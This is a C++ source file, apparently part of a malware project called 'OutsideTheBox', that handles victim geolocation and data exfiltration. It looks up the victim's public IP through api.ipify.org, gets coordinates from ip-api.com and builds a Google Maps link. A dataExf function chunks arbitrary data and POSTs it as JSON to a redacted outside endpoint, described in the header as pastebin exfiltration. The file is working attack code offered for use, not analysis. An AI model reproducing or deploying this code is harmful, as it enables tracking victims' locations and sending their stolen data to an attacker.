/*
 *
 * This File handle the location fetching and the pastebin exfiltration 
 *
 */

#include "outsideTheBox.h"


namespace OutsideTheBox {
  namespace { // private function
    size_t writer(char *ptr, size_t size, size_t size_of_data, void *data)
    {
      std::string *str = (std::string *) data;
      int i;

      for(i = 0; i < size * size_of_data; i++)
      {
        (*str) += ptr[i];
      }

      return size * size_of_data;
    }
  }

  CURL * init() {
    CURL *hnd;

    std::string victimIPLocation;

    hnd = curl_easy_init();
    curl_easy_setopt(hnd, CURLOPT_BUFFERSIZE, 102400L);
    curl_easy_setopt(hnd, CURLOPT_NOPROGRESS, 1L);
    curl_easy_setopt(hnd, CURLOPT_USERAGENT, "curl/8.11.1");
    curl_easy_setopt(hnd, CURLOPT_MAXREDIRS, 50L);
    curl_easy_setopt(hnd, CURLOPT_HTTP_VERSION, (long)CURL_HTTP_VERSION_2TLS);
    curl_easy_setopt(hnd, CURLOPT_FTP_SKIP_PASV_IP, 1L);
    curl_easy_setopt(hnd, CURLOPT_TCP_KEEPALIVE, 0L);
    curl_easy_setopt(hnd, CURLOPT_WRITEFUNCTION, writer);

    return hnd;
  }

  std::string getVictimsIp(CURL *hnd) {
    CURLcode ret;
    std::string victimIP;
    std::string retData {"None"};
    
    curl_easy_setopt(hnd, CURLOPT_URL, "https://api.ipify.org/");
    curl_easy_setopt(hnd, CURLOPT_WRITEDATA, &victimIP);

    ret = curl_easy_perform(hnd);

    if (ret == CURLE_OK) {
      retData = victimIP;
    }
    
    return retData;
  }

  std::vector<std::string> getVictimsIpLatLon(std::string IPLocation) {
    std::vector<std::string> latLon {"", ""};

    long unsigned int latFirstIndex {IPLocation.find("\"lat\":")};
    long unsigned int lonFirstIndex {IPLocation.find("\"lon\":")};
    long unsigned int lonFirstIndexDelimiter {IPLocation.find(",\"timezone\"")};

    long unsigned int latCount {lonFirstIndex - latFirstIndex};
    long unsigned int lonCount {lonFirstIndexDelimiter - lonFirstIndex};


    std::string lat {IPLocation.substr(latFirstIndex + 6, latCount - 7)};
    std::string lon {IPLocation.substr(lonFirstIndex + 6, lonCount - 6)};

    latLon[0] = lat;
    latLon[1] = lon;

    return latLon;
  }

  std::string getVictimsIpLocationInfos(CURL *hnd, std::string IP) {
    CURLcode ret;
    std::string victimIPLocation;
    std::string retData {"None"};

    std::string locationApiUrl = "http://ip-api.com/json/" + IP;
    
    curl_easy_setopt(hnd, CURLOPT_URL, locationApiUrl.c_str());
    curl_easy_setopt(hnd, CURLOPT_WRITEDATA, &victimIPLocation);

    ret = curl_easy_perform(hnd);

    if (ret == CURLE_OK) {
      retData = victimIPLocation;
    }
    
    return retData;
  }

  std::string getVictimsIpLocationMaps(std::string IPlat, std::string IPlon) {
    std::string mapsLink {"https://maps.google.com/?q="};

    // add latitude
    mapsLink += IPlat;

    // add comma delimiter
    mapsLink += ',';

    // add longitude
    mapsLink += IPlon;


    return mapsLink;
  }

  void truncateData(std::string *dataSector, std::string data, int start, unsigned short int sectorSize) {
    *dataSector = data.substr(start, sectorSize);
  }

  CURLcode dataExf(CURL* hnd, std::string data) {
    CURLcode ret;

    // CURL config
    struct curl_slist *headerList = NULL;

    headerList = curl_slist_append(headerList, "Accept: application/json");
    headerList = curl_slist_append(headerList, "Content-Type:application/json");
    curl_easy_setopt(hnd, CURLOPT_HTTPHEADER, headerList);

    curl_easy_setopt(hnd, CURLOPT_URL, "[REDACTED]");
    curl_easy_setopt(hnd, CURLOPT_VERBOSE, 1);
    curl_easy_setopt(hnd, CURLOPT_POST, true);

    const std::string leftAppliance {"{\"content\": \""};
    const std::string rightAppliance {"\"}"};
    
    unsigned const short int MAX_DATA_LENGTH {1985};
    const size_t dataSize {data.size()};


    std::vector<std::string> dataSectors{};
    
    // TRUNCATE THE DATA ONLY IF NECESSARY
    if (dataSize > MAX_DATA_LENGTH) {
      std::string dataSector {""};
      size_t iloc {0};
      size_t start {iloc * MAX_DATA_LENGTH};

      // TRUNCATING THE DATA
      while (start < dataSize) {
        truncateData(&dataSector, data, start, MAX_DATA_LENGTH);
        dataSectors.push_back(dataSector);

        start += MAX_DATA_LENGTH;
        iloc++;
      }
    } else {
      dataSectors.push_back(data);
    }
    
    // SENDING THE SECTORS
    for (int i {0}; i < dataSectors.size(); i++) {
      std::string json = leftAppliance + dataSectors[i] + rightAppliance;
      curl_easy_setopt(hnd, CURLOPT_POSTFIELDS, json.c_str());
      ret = curl_easy_perform(hnd);
    }

    return ret;
  }

  void cleanup(CURL * hnd) {
    curl_easy_cleanup(hnd);
    hnd = NULL;
  }
}